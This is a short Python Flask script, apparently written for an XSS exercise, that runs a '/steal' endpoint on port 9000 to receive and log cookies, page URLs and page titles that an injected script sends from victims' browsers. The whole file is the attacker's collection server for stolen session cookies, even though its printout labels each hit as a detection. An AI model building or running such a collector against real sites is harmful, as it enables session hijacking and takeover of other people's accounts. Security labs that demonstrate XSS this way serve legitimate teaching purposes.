#this file is run for xss attack
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route("/steal")
def steal():
    print("\n🚨 XSS ATTACK DETECTED")
    print("\nTime:", datetime.now())
    print("\nCookie:", request.args.get("cookie"))
    print("\nURL:", request.args.get("url"))
    print("\nPage Title:", request.args.get("title"))
    return "OK"
if __name__ == "__main__":
    app.run(port=9000)
